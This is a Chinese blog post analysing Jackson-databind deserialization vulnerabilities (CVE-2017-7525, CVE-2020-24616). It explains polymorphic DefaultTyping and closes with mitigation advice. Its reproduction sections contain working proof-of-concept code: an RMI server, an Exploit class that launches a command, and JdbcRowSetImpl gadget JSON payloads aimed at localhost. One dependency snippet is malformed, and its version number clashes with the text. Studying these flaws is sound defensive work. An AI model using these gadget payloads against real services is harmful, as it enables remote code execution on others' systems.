## 前言

最近公司内部提供了一份应用高危漏洞的清单，其中提到了[fastjson](https://juejin.cn/post/6860729238723510279)和jackson，因为之前对fastjson因为多态问题引发的反序列化问题有过了解，所以打算也做一个简单的分析。

## 漏洞简述

> 2020年08月27日，360CERT监测发现 jackson-databind 发布了 jackson-databind 序列化漏洞 的风险通告，该漏洞编号为 CVE-2020-24616 ，漏洞等级：高危，漏洞评分：7.5。
>
> br.com.anteros:Anteros-DBCP 中存在新的反序列化利用链，可以绕过 jackson-databind 黑名单限制，远程攻击者通过向使用该组件的web服务接口发送特制请求包，可以造成 远程代码执行 影响。

受影响的版本：`fasterxml:jackson-databind`: <2.9.10.6，该版本还修复了下述利用链：

- org.arrahtec:profiler-core
- com.nqadmin.rowset:jdbcrowsetimpl
- com.pastdev.httpcomponents:configuration

上述 package 中存在新的反序列化利用链，可以绕过 `jackson-databind` 黑名单限制，远程攻击者通过向使用该组件的web服务接口发送特制请求包，可以造成 `远程代码执行` 影响。

## 漏洞分析

其实此漏洞和前几年jackson爆出来的另外一个漏洞(CVE-2017-7525)是一脉相承的，都是利用反序列化远程执行代码；至于为什么会出现这个问题，其实归根结底和多态有关，下面做一个简单的分析；

### 序列化中的多态问题

我们平时见得最多的json格式可能像下面这样：

```json
{"fruit":{"name":"apple"},"mode":"online"}
```

里面是没有任何类信息的，拿到json字符串直接通过相关方法转化为对象：

```java
public <T> T readValue(String content, Class<T> valueType)
```

像以上这种情况基本上是不会有什么问题的，但是很多业务中有**多态**的需求，比如像下面这样：

```java
//水果接口类
public interface Fruit {
}

//通过指定的方式购买水果
public class Buy {
    private String mode;
    private Fruit fruit;
}

//具体的水果类--苹果
public class Apple implements Fruit {
    private String name;
}

//具体的水果类--香蕉
public class Banana implements Fruit {
    private String name;
}
```

可以发现这里的Buy对象里面存放的是Fruit，并不是具体的某种水果，如果这时候你去序列化：

```java
Banana banana = new Banana();
banana.setName("banana");

Buy buy = new Buy("online", banana);

ObjectMapper mapper = new ObjectMapper();

// 序列化
String jsonString = mapper.writeValueAsString(buy);
System.out.println("toJSONString : " + jsonString);

// 反序列化
Buy newBuy = mapper.readValue(jsonString, Buy.class);
banana = (Banana) newBuy.getFruit();
System.out.println(banana);
```

序列化是可以成功的，结果如下所示：

```java
{"mode":"online","fruit":{"name":"banana"}}
```

但是在反序列化的时候，程序中完全没法知道fruit到底是苹果还是香蕉，所以会直接报错：

```java
Exception in thread "main" com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of `com.jackson.Fruit` (no Creators, like default construct, exist): abstract types either need to be mapped to concrete types, have custom deserializer, or contain additional type information
```

面对这种问题，jackson提供了相关的技术支持，主要有以下这么两种：

- 全局DefaultTyping机制
- 为Class添加@JsonTypeInfo



### 多态问题支持

全局DefaultTyping机制相对来说比较简单，一个配置就解决了；而@JsonTypeInfo注解模式相对来说比较麻烦；

#### 全局DefaultTyping机制

只需要对ObjectMapper开启此配置即可：

```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
```

这样再去执行刚刚的序列化方法，结果会是如下这样：

```json
{"@class":"com.jackson.Buy","mode":"online","fruit":{"@class":"com.jackson.impl.Banana","name":"banana"}}
```

可以发现在json里面包含了类信息，这样在反序列化的时候，就能识别具体的类，这样就能反序列化成功；

#### JsonTypeInfo注解模式

此种模式需要针对每种类型做专门的处理，相对来说比较麻烦，我们需要在Fruit接口中做处理：

```java
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes(value = { @JsonSubTypes.Type(value = Apple.class, name = "a"),
        @JsonSubTypes.Type(value = Banana.class, name = "b") })
public interface Fruit {

}
```

可以发现如果发现是子类Apple，就用字符a代替；如果发现是子类Banana，就用字符b代替；序列化的结果如下：

```json
{"mode":"online","fruit":{"type":"b","name":"banana"}}
```

这种模式通过在json字符串中添加了具体类的type，这样在反序列化的时候也同样可以成功；

### 漏洞重现

以上介绍了两种jackson在解决多态问题的方案，那问题出在哪里；其实问题的根源就出在**全局DefaultTyping机制**中对生成的json字符串中包含了类信息，这样对攻击者来说就相当于留了一个后门，可以通过在json字符串中传入一些特殊的类，对服务器引发灾难性后果；上面也提到此问题其实在(CVE-2017-7525)漏洞中已经出现，这里可以做一个简单模拟；

#### CVE-2017-7525重现

当时要求的版本是不低于2.8.9，这里直接使用此版本来模拟；

```xml
<dependency>
	<groupId>com.fasterxml.jackson.core</groupId>
	<artifactId>jackson-databind</artifactId>
	version>2.8.10</version>
</dependency>
```

一个常见的攻击类是：**com.sun.rowset.JdbcRowSetImpl**，此类的dataSourceName支持传入一个rmi的源，然后可以设置autocommit自动连接，执行rmi中的方法；
这里首选需要准备一个RMI类：

```java
public class RMIServer {
    public static void main(String argv[]) {
         Registry registry = LocateRegistry.createRegistry(1098);
         Reference reference = new Reference("Exploit", "Exploit", "http://localhost:8080/");
         registry.bind("Exploit", new ReferenceWrapper(reference));
    }
}
```

这里的Reference指定了类名，以及远程地址，可以从远程服务器上加载class文件来实例化；准备好Exploit类，编译成class文件，然后把他放在本地的http服务器中即可；

```java
public class Exploit {
    public Exploit() {
         Runtime.getRuntime().exec("calc");
    }
}
```

这里我们做了一个简单的模拟，让服务器在本地调用计算器；

有了以上这些，下面要准备攻击的json字符串，如下所示：

```java
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1098/Exploit","autoCommit":true}
```

反序列化相关代码如下：

```java
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
ObjectMapper objectMapper = new ObjectMapper();
objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1098/Exploit\",\"autoCommit\":true}";
objectMapper.readValue(json, Object.class);
```

在反序列化的时候，先执行setDataSourceName方法，然后setAutoCommit的时候会自动连接设置的dataSourceName属性，最终获取到Exploit类执行其中的相关操作，以上的程序会在本地调起计算器；


![image-20210325155140627.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/750d4d74d35740389dffc1d60344459e~tplv-k3u1fbpfcp-watermark.image)

如果做升级处理，升级到2.8.10版本，同样执行以上的代码，结果如下：

```java
Exception in thread "main" com.fasterxml.jackson.databind.JsonMappingException: Invalid type definition for type Lcom/sun/rowset/JdbcRowSetImpl;: Illegal type (com.sun.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons
```

可以发现JdbcRowSetImpl已经进入了jackson的黑名单中；但是黑名单往往是不全的，后续可能经常爆出漏洞，比如这次的漏洞；

#### CVE-2020-24616重现

这样同样使用漏洞前的版本，我们使用2.9.10.5版本，存在漏洞的com.nqadmin.rowset.jdbcrowsetimpl，引入如下：

```xml
<dependency>
	<groupId>com.fasterxml.jackson.core</groupId>
	<artifactId>jackson-databind</artifactId>
	<version>2.9.10.5</version>
</dependency>
<dependency>
    <groupId>com.nqadmin.rowset</groupId>
    <artifactId>jdbcrowsetimpl</artifactId>
    <version>1.0.2</version>
</dependency>
```

再次提供攻击json字符串：

```json
{"@class":"com.nqadmin.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1098/Exploit","autoCommit":true}
```

执行上面同样的代码，使用如上json字符串，同样能够调起本地计算器；下面要做的就是升级版本：>2.9.10.6；再次执行结果如下：

```java
Exception in thread "main" com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.nqadmin.rowset.JdbcRowSetImpl`: Illegal type (com.nqadmin.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons
```

可以发现`com.nqadmin.rowset.JdbcRowSetImpl`已经进入黑名单；



## 漏洞总结

可以发现类似的漏洞在很多json序列化工具中都有，黑名单的方案其实也是比较临时性的，想要彻底解决这个问题其实是很难的，因为你不知道以后还会出现什么jar包有远程执行的功能，所以下面对jackson序列化工具做一点使用上的总结；

### 不要使用DefaultTyping

可以发现问题的根源在于DefaultTyping方式导致在json字符串中出现了类信息，其实上面也介绍了完全可以通过JsonTypeInfo方式代替；只不过相对来说麻烦点，但是对于安全性来说这点不算什么；

可以发现新版jackson中已经不建议使用DefaultTyping了，此方法已经被标识为`@Deprecated`

```java
    @Deprecated
    public ObjectMapper enableDefaultTyping(DefaultTyping applicability, JsonTypeInfo.As includeAs) {
    }
```

### 反序列化指定具体类

其实我们可以发现这些黑名单中的类，我们平时很少使用，我们大部分情况都使用的是一些业务类，这样我们在反序列化的时候尽量使用具体类，不要使用Object，如上面的代码：

```java
objectMapper.readValue(json, Object.class);
```

如果我们这里填的是具体的业务类，如果真的接收到一个攻击json字符串，其实程序首先也会对json中的类信息是否和指定的类信息是否一致，如果不一致，直接不会执行：

```java
objectMapper.readValue(json, Banana.class);
```

上面再反序列化的时候，直接报错：

```java
Exception in thread "main" com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Missing type id when trying to resolve subtype of [simple type, class com.jackson.impl.Banana]: missing type id property 'type'
```

## 感谢关注
> 可以关注微信公众号「**回滚吧代码**」，第一时间阅读，文章持续更新；专注Java源码、架构、算法和面试。